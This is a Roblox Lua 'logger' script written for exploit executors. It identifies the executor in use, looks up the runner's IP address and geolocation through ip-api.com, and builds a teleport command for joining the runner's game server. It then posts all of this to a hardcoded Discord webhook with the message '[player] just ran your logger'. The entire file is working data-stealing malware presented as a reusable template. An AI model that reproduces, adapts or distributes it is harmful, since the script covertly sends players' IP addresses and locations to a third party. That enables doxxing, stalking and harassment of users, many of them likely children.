local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
print(helo) --line above generates a script that allows u to join the logged user

--checks executor
local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

local url =
   "https://discord.com/api/webhooks/1289429348683616297/EPm5Z7UAwweLVfH9LJ1pNHk3leqEKkd3jSAtloG8aSntsqOw3RowdUl8AW33_ii3QrRO" -- Your webhook URL
local data = {
            ["username"] = "Salmon-L0G", -- Webhook name
            ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", -- Avatar image URL
    
    ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** just ran your logger", -- Normal message
    ["embeds"] = {
       {
           ["title"] = "** " ..game.Players.LocalPlayer.Name.. " just ran your logger**",
           ["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. " Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
           ["type"] = "rich", -- This sends all the info grabbed using the API + username and executor
           ["color"] = 14680319,
           ["footer"] = {
             ["text"] = "" ..join_script.. "", -- Sends join script
           },
       },
   }
}

local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef) -- Post